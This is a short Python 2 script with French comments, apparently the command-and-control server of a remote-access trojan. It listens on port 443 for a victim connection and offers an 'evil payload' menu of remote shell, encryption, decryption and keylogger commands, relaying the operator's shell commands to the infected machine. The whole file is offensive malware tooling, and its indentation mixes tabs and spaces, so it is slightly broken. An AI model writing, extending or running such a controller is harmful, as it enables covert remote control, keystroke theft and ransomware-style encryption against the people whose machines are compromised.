# -*- coding: utf-8 -*-

#############################
# Title - Serveur Socket
# Date - 05/09/2017
# Author - Rémi LIQUETE
#############################


############ FUNCTION ################

def recv_msg(sock):
    # Read message length and unpack it into an integer
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    # Read the message data
    return recvall(sock, msglen)

def recvall(sock, n):
    # Helper function to recv n bytes or return None if EOF is hit
    data = ''
    while len(data) < n:
    	print("Data : ", len(data))
    	print("N : ", n)
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

############ BODY ####################

import socket
import struct

# Initialisation des variables
Serveur_IP = "127.0.0.1"
Serveur_Port = 443
PacketSize = 10240

# On met le serveur en écoute
serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverSocket.bind(('', Serveur_Port))
serverSocket.listen(1)

#
client, addr = serverSocket.accept()
print("Client : %s:%s") % (addr[0], addr[1])

# Boucle d'écoute sur le client
while(True):
	print("Welcome to evil payload !!!\n\n1. Shell\n2. Crypt\n3. Decrypt\n4. Keylogger\n5. Exit")
	cmd = 'notDigit'
	while(not(cmd.isdigit()) or not(int(cmd) > 0 and int(cmd) <= 5)):
		cmd = raw_input("> ")

	client.send(cmd)

	if(int(cmd) == 1):
		print("Put your shell command here below.")
		cmd = raw_input("> ")
	elif(int(cmd) == 5):
		print("See you soon..")
		cmd = "Exit"

	client.send(cmd)

	data = client.recv(PacketSize)
	data = data[:-15]
	if not data:
		break
	print("%s") % data
client.close()
